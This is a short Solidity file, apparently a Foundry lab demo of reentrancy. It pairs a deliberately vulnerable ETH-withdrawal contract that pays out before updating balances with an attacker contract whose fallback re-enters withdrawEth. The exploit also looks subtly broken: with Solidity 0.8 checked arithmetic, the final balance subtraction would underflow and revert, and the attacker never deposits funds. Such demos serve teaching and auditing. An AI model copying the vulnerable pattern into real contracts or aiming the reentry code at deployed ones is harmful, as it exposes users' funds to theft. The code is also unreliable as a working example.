// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "forge-std/Test.sol";

contract ReentrancyVuln {
    mapping(address => uint256) balances;

    function giveEth() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdrawEth() public {
        uint256 amountToWithdraw = balances[msg.sender];
        (bool success,) = payable(msg.sender).call{value: amountToWithdraw}("");
        require(success);
        console.log(amountToWithdraw, "ETH SENT TO: ", msg.sender);

        // check effects fail
        balances[msg.sender] -= amountToWithdraw;
    }
}

contract ExploitReentrancy {

    uint times_to_reenter = 0;

    function withdrawEthFromVulnContract(address reentrant_contract) public {
        (bool success, ) = reentrant_contract.call(abi.encodeWithSignature("withdrawEth()"));
        // require(success);
    }
    fallback() external payable {
        if (times_to_reenter < 1) {
            console.log("Fallback invoked, balance of contract is now: ", address(this).balance);
            (bool success,) = msg.sender.call(abi.encodeWithSignature("withdrawEth()"));
        }
        times_to_reenter = times_to_reenter + 1;

    }
}
